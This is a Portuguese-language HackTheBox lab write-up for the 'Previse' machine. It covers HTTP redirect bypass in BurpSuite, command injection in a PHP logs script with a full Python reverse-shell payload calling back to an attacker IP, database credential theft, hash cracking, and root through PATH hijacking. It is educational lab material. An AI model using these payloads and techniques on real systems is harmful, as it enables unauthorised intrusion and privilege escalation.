# Previse

## Informações da Máquina

| Atributo | Valor |
|----------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Easy |
| **OS** | Linux (Ubuntu) |
| **Técnicas** | HTTP Response Manipulation, RCE, Hash Cracking, PATH Hijacking |
| **Link HTB** | [https://app.hackthebox.com/machines/Previse](https://app.hackthebox.com/machines/Previse) |

## Resumo

Máquina Linux com site que faz redirecionamento via código de status HTTP. Manipulação de response no BurpSuite permite acessar página de criação de conta. RCE através de parâmetro em script PHP. Credenciais obtidas do banco de dados MySQL. Escalação via PATH hijacking em script sudo.

## Enumeration/Scanning

### Port Scanning

```bash
nmap -sVC -oN nmap.out -vv [IP]
```

**Portas abertas:**
- 22/tcp - SSH (OpenSSH 7.6p1 Ubuntu)
- 80/tcp - HTTP (Apache httpd 2.4.29 Ubuntu)

## Exploitation

### Response Manipulation

Ao acessar endpoints manualmente, descobrimos `/accounts.php`. O servidor retorna status `301` (redirect), mas o conteúdo HTML já vem na resposta.

**Bypass com BurpSuite:** Interceptar response e alterar status code de `301` para `200`.

**Resultado:** Acesso à página de criação de contas.

### Account Creation

Criando conta através de `/accounts.php`, obtemos acesso ao site.

### Source Code Download

Site possui backup do código-fonte disponível para download.

Analisando `logs.php`:

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

### RCE via Command Injection

Parâmetro `delim` é vulnerável a command injection:

```bash
POST /logs.php
delim=comma;/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.47",1337));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"]);'
```

**Shell obtido:** www-data

### Database Access

Credenciais encontradas no código-fonte (`config.php`):

```bash
mysql -u root -p'myS[REDACTED]' previse
```

Extraindo hash de senha:

```sql
SELECT * FROM accounts;
```

**Hash encontrada** para usuário `m4lwhere`.

### Hash Cracking

```bash
hashid -m "\$1\$h6k3X5db\$pp8WQ5R5YYL5bNy0j2wP70"
# [+] MD5 Crypt [Hashcat Mode: 500]

hashcat -m 500 -a 0 hash.txt ~/wordlists/rockyou.txt
```

**Senha crackeada:** `ilovecody112235!`

### SSH Access

```bash
ssh m4lwhere@[IP]
# Password: ilovecody112235!

cat user.txt
```

**User Flag:** ✓

## Privilege Escalation

### Sudo Permissions

```bash
sudo -l
# (root) /opt/scripts/access_backup.sh
```

### Script Analysis

```bash
cat /opt/scripts/access_backup.sh
```

Script usa comando `gzip` sem path absoluto.

### PATH Hijacking

```bash
cd /home/m4lwhere
echo '#!/bin/bash' > gzip
echo '/bin/bash' >> gzip
chmod +x gzip

export PATH=/home/m4lwhere:$PATH

sudo /opt/scripts/access_backup.sh
```

**Shell obtido:** root

```bash
cat /root/root.txt
```

**Root Flag:** ✓

## Lições Aprendidas

- **HTTP response manipulation** pode revelar conteúdo mesmo com redirects (status 301/302)
- Response bodies são enviados antes do redirect - podem ser capturados e modificados
- **Command injection** em PHP `exec()` permite RCE quando input não é sanitizado
- **PATH hijacking** funciona quando scripts usam comandos sem path absoluto
- Sempre verificar se comandos em scripts sudo usam paths absolutos

---

*Writeup by kp*
